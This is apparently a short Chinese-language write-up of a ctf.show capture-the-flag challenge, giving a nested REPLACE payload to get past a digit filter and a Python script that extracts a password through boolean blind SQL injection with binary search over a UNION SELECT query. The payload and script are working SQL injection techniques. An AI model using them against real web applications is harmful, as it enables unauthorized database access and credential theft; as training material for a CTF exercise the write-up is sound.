# 知识点
### replace
```plsql
replace(original-string，search-string，replace-string)
```
### sql盲注
```plsql
if(ascii(substr((select password from ctfshow_user4 where username='flag'),{i},1))<{j},'True','False'
```
# 思路
### 方法一
```plsql
replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(password,"0",")"),"1","!"),"2","@"),"3","#"),"4","$"),"5","%"),"6","^"),"7","&"),"8","*"),"9","(")
```
### 方法二 
sql盲注
```plsql
import requests
url = 'http://ffd4ab76-5c5e-4136-b7c0-699a8a90c0d4.challenge.ctf.show/api/v4.php'
flag = ''
for i in range(60):
    lenth = len(flag)
    min, max = 32, 128
    while True:
        j = min + (max-min)//2
        if(min == j):
            flag += chr(j)
            print(flag)
            break

        payload = f"?id=' union select 'a',if(ascii(substr((select password from ctfshow_user4 where username='flag'),{i},1))<{j},'True','False') --+"
        r = requests.get(url=url+payload).text

        if('True' in r):
            max = j
        else:
            min = j

```
